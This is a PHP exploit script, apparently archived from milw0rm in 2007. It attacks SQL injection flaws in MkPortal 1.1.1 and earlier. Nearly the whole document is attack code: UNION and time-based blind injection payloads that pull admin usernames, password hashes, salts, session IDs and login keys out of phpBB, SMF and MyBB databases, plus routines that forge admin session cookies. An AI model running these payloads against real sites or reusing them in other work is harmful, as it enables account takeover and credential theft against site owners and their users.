<html><head><title>MkPortal <= 1.1.1 reviews / gallery modules SQL Injection Exploit</title></head><pre>&lt;?php

/*
[i] MkPortal &quot;reviews&quot; and &quot;gallery&quot; modules SQL Injection Exploit
[i] Vulnerable versions: MkPortal &lt;= 1.1.1
[i] Bug discovered by: Coloss
[i] Exploit by: Coloss
[i] Date: 06.07.2007
[i] This is priv8 not for kids

[Notes]
At this time MkPortal 1.1.1 is the latest stable release
Currently implemented: phpbb, smf and mybb
*/


$exptime = 3600;
$stcnt = 300000;
$maxnull = 5;

$opts = getopt(&quot;u:U:P:f:m:d:o:&quot;);

$vars = array ( &quot;phpbb&quot;, &quot;1 UNION SELECT %s FROM phpbb_users WHERE user_id=2&quot;,
                &quot;phpbb_sid&quot;, &quot;1 UNION SELECT %s FROM phpbb_sessions WHERE session_user_id=2 ORDER BY descrizione DESC LIMIT 1&quot;,
                &quot;smf&quot;, &quot;1 UNION SELECT %s FROM smf_members WHERE ID_MEMBER=1&quot;,
                &quot;mybb&quot;, &quot;1 UNION SELECT %s FROM mybb_users WHERE uid=1&quot;,
);


print
&quot;[i] MkPortal \&quot;reviews\&quot; and \&quot;gallery\&quot; modules SQL Injection Exploit
[i] Vulnerable versions: MkPortal &lt;= 1.1.1
[i] Bug discovered by: Coloss
[i] Exploit by: Coloss
[i] Date: 06.07.2007
[i] This is priv8 not for kids\n\n&quot;;


if ($opts[u] == '')
        die(help($argv[0]));

if (!strncmp($opts[u], &quot;http&quot;, 4))
        $url = $opts[u];
else
        $url = &quot;http://&quot;.$opts[u];

if ($opts[U])
        $user = $opts[U];
if ($opts[P])
        $pass = $opts[P];
if ($opts[f])
        $forum = $opts[f];
if ($opts[m])
        $met = $opts[m];
if ($opts[o])
        $file = $opts[o];
if ($opts[d])
        $dir = $opts[d];

$cookies = '';
$delay = $min = $max = $mid = 0;
$fld1 = $fld2 = '';

if (!$forum)
        die(&quot;[X] You haven't specified any forum type!\n&quot;);

echo &quot;[+] Target: $url [$forum]\n\n&quot;;

exploit();


function exploit_gallery ($f)
{
        global $cookies, $url, $fld1, $fld2;
        $sql = get_sql($f);
        $str = &quot;NULL,&quot;.$fld1.&quot;,&quot;.$fld2.&quot;,NULL,NULL&quot;;
        $req = sprintf($sql, $str);

        $u = $url.&quot;index.php?ind=gallery&amp;op=edit_file&amp;iden=&quot;.urlencode($req);
        $html = Send($u, NULL, $cookies);
        if (strstr($html, &quot;ERROR: Database error&quot;))
                die(&quot;[X] SQL Query Error.. probably wrong table prefix\n&quot;);
        else if (strstr($html, &quot;&lt;title&gt;Error&lt;/title&gt;&quot;))
                die(&quot;[X] This method failed. Try something else\n&quot;);

        $var1 = get_string($html,&quot;name=\&quot;titolo\&quot; value=\&quot;&quot;,&quot;\&quot;&quot;);
        $var2 = get_string($html,&quot;name=\&quot;descrizione\&quot; class=\&quot;bgselect\&quot;&gt;&quot;,&quot;&lt;&quot;);

        return ($var1.&quot; &quot;.$var2);
}

function get_delay ($cnt, $f, $u)
{
        global $url, $cookies, $fld1, $fld2, $met;

        $sql = get_sql($f);

        if (strstr($met, &quot;gallery&quot;))
                $str = &quot;NULL,&quot;.$fld1.&quot;,&quot;.$fld2.&quot;,NULL,NULL&quot;;
        else
                $str = $fld1;

        $inj = sprintf($sql, $str);

        if (strstr($inj, &quot;ORDER BY&quot;)) {
                list($base, $order) = explode(&quot;ORDER BY&quot;, $inj);
                $inj = $base.&quot;AND IF(ORD(LOWER(SUBSTR(%s,%d,1)))%s,1,BENCHMARK(%d,MD5(31337))) ORDER BY&quot;. $order;
        }
        else
                $inj .= &quot; AND IF(ORD(SUBSTR(%s,%d,1))%s,1,BENCHMARK(%d,MD5(31337)))&quot;;

        $req = sprintf($inj, $fld1, 1, &quot;=1&quot;, $cnt);
        $u .= urlencode($req);

        $start = getmicrotime();
        Send($u, NULL, $cookies);
        $end = getmicrotime();

        $delay = intval(10 * ($end - $start));
        return $delay;
}

function get_normaldelay ($f, $u)
{
        global $stcnt;

        $na = get_delay(1,$f,$u);
        $da = get_delay($stcnt,$f,$u);
        $nb = get_delay(1,$f,$u);
        $db = get_delay($stcnt,$f,$u);
        $nc = get_delay(1,$f,$u);
        $dc = get_delay($stcnt,$f,$u);

        $mean_delayed = intval(($da + $db + $dc) / 3);
        if ($mean_delayed &lt; 2)
                die(&quot;Failed. The Answer was too rapid, probably you have not enough privileges\n&quot;);
        return $mean_delayed;
}

function exploit_blind ($sql, $u, $field)
{
        global $cookies, $stcnt, $delay, $min, $max, $mid;

        $cnt = $stcnt * 4;

        echo &quot;[-&gt;] Trying to find value for '&quot;.$field.&quot;'\n&quot;;

        for ($i = 1; $i &lt; 51; $i++) {
                for ($j = $min; $j &lt;= $max; $j++) {
                        if ($j == $mid)
                                $j = 97;
                        $req = sprintf($sql, $field, $i, &quot;=$j&quot;, $cnt);
                        $ur = $u.urlencode($req);
                        $start = getmicrotime();
                        Send($ur, NULL, $cookies);
                        $end = getmicrotime();

                        $dtime = intval(10 * ($end - $start));
                        if ($dtime &gt; ($delay * 2)) {
                                $out .= chr($j);
                                echo &quot;[+] Current value for '&quot;.$field.&quot;' (&quot;.$i.&quot;): &quot;.$out.&quot;\n&quot;;
                                break;
                        }
                        if ($j == $max)
                                $i = 41;
                }
        }
        if ($out)
                echo &quot;\n[-&gt;] Found value for '&quot;.$field.&quot;': &quot;.$out.&quot;\n\n&quot;;
        return $out;
}


function exploit_gallery_blind ($f)
{
        global $fld1, $fld2, $url;

        $str = &quot;NULL,&quot;.$fld1.&quot;,&quot;.$fld2.&quot;,NULL,NULL&quot;;
        $sql = get_sql($f);
        $inj = sprintf($sql, $str);

        $u = $url.&quot;index.php?ind=gallery&amp;op=edit_file&amp;iden=&quot;;

        $var1 = exploit_init_blind($f, $u, $inj, $fld1);
        $var2 = exploit_init_blind($f, $u, $inj, $fld2);

        return ($var1.&quot; &quot;.$var2);
}

function exploit_reviews ($f)
{
        global $fld1, $fld2, $url;

        $u = $url.&quot;index.php?ind=reviews&amp;op=update_file&amp;iden=&quot;;
        $sql = get_sql($f);

        $inj = sprintf($sql, $fld1);
        $var1 = exploit_init_blind($f, $u, $inj, $fld1);

        $inj = sprintf($sql, $fld2);
        $var2 = exploit_init_blind($f, $u, $inj, $fld2);

        return ($var1.&quot; &quot;.$var2);
}

function exploit_init_blind ($f, $u, $inj, $field)
{
        global $cookies, $delay, $fld1, $fld2, $mid;

        if (strstr($inj, &quot;ORDER BY&quot;)) {
                list($base, $order) = explode(&quot;ORDER BY&quot;, $inj);
                if ($mid == 58)
                        $inj = $base.&quot;AND IF(ORD(LOWER(SUBSTR(%s,%d,1)))%s,BENCHMARK(%d,MD5(31337)),1) ORDER BY&quot;. $order;
                else
                        $inj = $base.&quot;AND IF(ORD(SUBSTR(%s,%d,1))%s,BENCHMARK(%d,MD5(31337)),1) ORDER BY&quot;. $order;
        }
        else {
                if ($mid == 58)
                        $inj .= &quot; AND IF(ORD(LOWER(SUBSTR(%s,%d,1)))%s,BENCHMARK(%d,MD5(31337)),1)&quot;;
                else
                        $inj .= &quot; AND IF(ORD(SUBSTR(%s,%d,1))%s,BENCHMARK(%d,MD5(31337)),1)&quot;;
        }

        echo &quot;[-&gt;] Starting blind sql injection!\n&quot;;

        echo &quot;[+] Getting standard response delay... &quot;;
        $delay = get_normaldelay($f,$u);
        echo $delay.&quot;ds\n\n&quot;;

        $var = exploit_blind($inj, $u, $field);
        if (strstr($f, &quot;sid&quot;) &amp;&amp; !$var)
                die(&quot;[X] Probably there are more sid in the table.. so we cannot fetch it.. retry later.\n&quot;);

        return $var;
}

function get_data ($f)
{
        global $met;

        switch ($met) {
                case 'reviews':
                        $res = exploit_reviews($f); break;
                case 'gallery-blind':
                        $res = exploit_gallery_blind($f); break;
                case 'gallery':
                        $res = exploit_gallery($f); break;
                default:
                        die(&quot;[X] Invalid exploit method specified\n&quot;);
        }
        return $res;
}

function phpbb_exploit ()
{
        global $dir, $url, $user, $pass, $cookies, $forum, $exptime, $fld1, $fld2, $min, $max, $mid;

        if ($user &amp;&amp; $pass) {
                echo &quot;[+] Logging in... &quot;;

                $u = $url.$dir.&quot;login.php?login=true&quot;;
                $post = &quot;username=&quot;.$user.&quot;&amp;password=&quot;.$pass.&quot;&amp;redirec=portalhome&amp;submit=Login&quot;;

                $html = Send($u, $post, NULL, TRUE);

                $lines = explode(&quot;\n&quot;, $html);

                foreach($lines as $line) {
                        if (strstr($line, &quot;Set-Cookie&quot;) &amp;&amp; strstr($line, &quot;sid&quot;)) {
                                $cookies = get_string($line, &quot;Set-Cookie: &quot;, &quot;;&quot;);
                                $c++;
                        }
                }
                if (!$cookies || $c &lt; 2)
                        die(&quot;Failed\n&quot;);
                echo &quot;Successfull\n\n&quot;;
        }

        $fld1 = &quot;username&quot;; $fld2 = &quot;user_password&quot;;
        $min = 48; $max = 122; $mid = 58;

        $res = get_data($forum);
        list($auesr, $apwd) = explode(&quot; &quot;, $res);
        if ($auser &amp;&amp; strlen($apwd) == 32) {
                owrite(&quot;\n[+] Target: $url [$forum]\n&quot;);
                owrite(&quot;[-&gt;] Found admin username: '&quot;.$auser.&quot;'\n&quot;);
                owrite(&quot;[-&gt;] Found admin hash password: '&quot;.$apwd.&quot;'\n&quot;);
        }
        else
                die(&quot;[X] Failed to retrive informations\n&quot;);

        $fld1 = &quot;session_id&quot;; $fld2 = &quot;session_time&quot;;
        $max = 102;

        $res = get_data($forum.&quot;_sid&quot;);
        list($sid,$start) = explode(&quot; &quot;, $res);
        if ($sid &amp;&amp; strlen($sid) == 32) {
                $t = (int) (time() - $start - $exptime);
                if ($t &gt;= 0)
                        echo &quot;[!] Found admin sid ('&quot;.$sid.&quot;') but it should not be valid anymore\n&quot;;
                else
                        owrite(&quot;[-&gt;] Found admin sid: '&quot;.$sid.&quot;' valid for ~&quot;.abs($t).&quot;s\n&quot;);
        }
        else
                echo &quot;[!] No admin sid was found\n&quot;;
}

function smf_exploit ()
{
        global $user, $pass, $url, $dir, $cookies, $forum, $fld1, $fld2, $min, $max;

        $base = 'a:4:{i:0;s:1:&quot;1&quot;;i:1;s:40:&quot;%s&quot;;i:2;i:1184000000;i:3;i:0;}';

        if ($user &amp;&amp; $pass) {
                echo &quot;[+] Logging in... &quot;;

                $u = $url.$dir.&quot;index.php?action=login2&quot;;
                $post = &quot;user=&quot;.$user.&quot;&amp;passwrd=&quot;.$pass.&quot;&amp;cookieneverexp=on&amp;submit=Login&quot;;
                $html = Send($u, $post, NULL, TRUE);

                $lines = explode(&quot;\n&quot;, $html);
                foreach($lines as $line) {
                        if (strstr($line, &quot;Set-Cookie&quot;) &amp;&amp; !strstr($line, &quot;PHPSESSID&quot;))
                                $cookies = get_string($line, &quot;Set-Cookie: &quot;, &quot;;&quot;);
                }
                if (!$cookies)
                        die(&quot;Failed\n&quot;);
                echo &quot;Successfull\n\n&quot;;
        }

        $fld1 = &quot;passwd&quot;; $fld2 = &quot;passwordSalt&quot;;
        $min = 48; $max = 102; $mid = 58;

        $res = get_data($forum);
        list($pwd,$salt) = explode(&quot; &quot;, $res);
        if ($pwd &amp;&amp; strlen($pwd) == 40 &amp;&amp; strlen($salt) == 4) {
                $pass = $pwd.$salt;
                $pass = sha1($pass);
                $cookie = sprintf($base, $pass);
                list($cname) = explode(&quot;=&quot;, $cookies);
                owrite(&quot;\n[+] Target: $url [$forum]\n&quot;);
                owrite(&quot;[+] Found admin cookie '&quot;.$cname.&quot;': '&quot;.urlencode($cookie).&quot;'\n&quot;);
        }
        else
                die(&quot;[X] Failed to retrive informations\n&quot;);
}

function mybb_exploit ()
{
        global $user, $pass, $url, $dir, $cookies, $forum, $fld1, $fld2, $min, $max, $mid;

        if ($user &amp;&amp; $pass) {
                echo &quot;[+] Logging in... &quot;;

                $u = $url.$dir.&quot;member.php&quot;;
                $post = &quot;username=&quot;.$user.&quot;&amp;password=&quot;.$pass.&quot;&amp;action=do_login&amp;submit=Login&quot;;
                $html = Send($u, $post, NULL, TRUE);

                $lines = explode(&quot;\n&quot;, $html);
                foreach($lines as $line) {
                        if (strstr($line, &quot;Set-Cookie&quot;) &amp;&amp; !strstr($line, &quot;PHPSESSID&quot;) &amp;&amp; !strstr($line, &quot;[last&quot;) &amp;&amp; !strstr($line,  
&quot; sid=&quot;)) {
                                $cookies = get_string($line, &quot;Set-Cookie: &quot;, &quot;;&quot;);
                        }
                }
                if (!$cookies)
                        die(&quot;Failed\n&quot;);
                echo &quot;Successfull\n\n&quot;;
        }

        $fld1 = &quot;loginkey&quot;; $fld2 = &quot;username&quot;;
        $min = 48; $max = 122; $mid = 91;

        $res = get_data($forum);
        list($key,$auser) = explode(&quot; &quot;, $res);
        if ($key &amp;&amp; strlen($key) == 50) {
                $cookie = sprintf($base, $pass);
                list($cname) = explode(&quot;=&quot;, $cookies);
                owrite(&quot;\n[+] Target: $url [$forum]\n&quot;);
                owrite(&quot;[+] Found admin cookie '&quot;.$cname.&quot;': '1_&quot;.$key.&quot;'\n&quot;);
        }
        else
                die(&quot;[X] Failed to retrive informations\n&quot;);

        $fld1 = &quot;password&quot;; $fld2 = &quot;salt&quot;;

        $res = get_data($forum);
        list($apwd,$salt) = explode(&quot; &quot;, $res);
        if ($apwd &amp;&amp; strlen($apwd) == 32 &amp;&amp; $salt &amp;&amp; strlen($salt) == 8) {
                owrite(&quot;[+] Found admin hash password: '&quot;.$apwd.&quot;'\n&quot;);
                owrite(&quot;[+] Found admin password salt: '&quot;.$salt.&quot;'\n&quot;);
        }
        else
                echo &quot;[!] No admin sid was found\n&quot;;
}

function exploit ()
{
        global $forum;

        switch ($forum) {
                case 'phpbb':
                        phpbb_exploit(); break;
                case 'smf':
                        smf_exploit(); break;
                case 'mybb':
                        mybb_exploit(); break;
                default:
                        die(&quot;Failed. Cannot handle this type of forum\n&quot;);
        }
}

function get_string ($str, $start, $end)
{
        $res = substr($str, strpos($str, $start)+strlen($start),strpos(substr($str, strpos($str, 
$start)+strlen($start),strlen($str)), $end));
        return $res;
}

function get_sql ($var)
{
        global $vars;

        for ($i = 0, $j = 1; $vars[$i]; $i++, $j++) {
                if ($vars[$i] == $var)
                        return $vars[$j];
        }
}

function getmicrotime()
{
        list($usec, $sec) = explode(&quot; &quot;, microtime());
        return ((float)$usec + (float)$sec);
}

function Send($url, $post_fields='', $cookie = '', $headers = FALSE)
{
        $ch = curl_init();
        $timeout = 120;

        curl_setopt ($ch, CURLOPT_URL, $url);
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);

        if ($post_fields) {
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        }

        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)');

        if(!empty($cookie))
                curl_setopt ($ch, CURLOPT_COOKIE, $cookie);

        if($headers === TRUE)
                curl_setopt ($ch, CURLOPT_HEADER, TRUE);
        else
                curl_setopt ($ch, CURLOPT_HEADER, FALSE);

        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);

        $fc = curl_exec($ch);
        curl_close($ch);

        return $fc;
}

function owrite ($msg)
{
        global $file, $debug;

        echo $msg;

        if ($file) {
                if (!($h = fopen($file, 'ab')) &amp;&amp; $debug) {
                        echo &quot;[X] Cannot open '$file'\n&quot;;
                        return;
                }
                if (fwrite($h, $msg) === FALSE &amp;&amp; $debug)
                        echo &quot;[X] Cannot write to '$file'\n&quot;;
                fclose($h);
        }
}

function help ($prog)
{
        print &quot;[-] Usage: $prog
         -u  &lt;url&gt;      -&gt; Sets Target url
        [-U] &lt;user&gt;     -&gt; Your username
        [-P] &lt;hash&gt;     -&gt; Your password
        [-f] &lt;type&gt;     -&gt; Sets Forum type (phpbb, smf or mybb)
        [-m] &lt;method&gt;   -&gt; Which method do you want to use (gallery or reviews)
        [-d] &lt;dir&gt;      -&gt; Sets forum subdirectory
        [-o] &lt;file&gt;     -&gt; Writes results to a file\n&quot;;
}

?&gt;

# milw0rm.com [2007-07-12]</pre></html>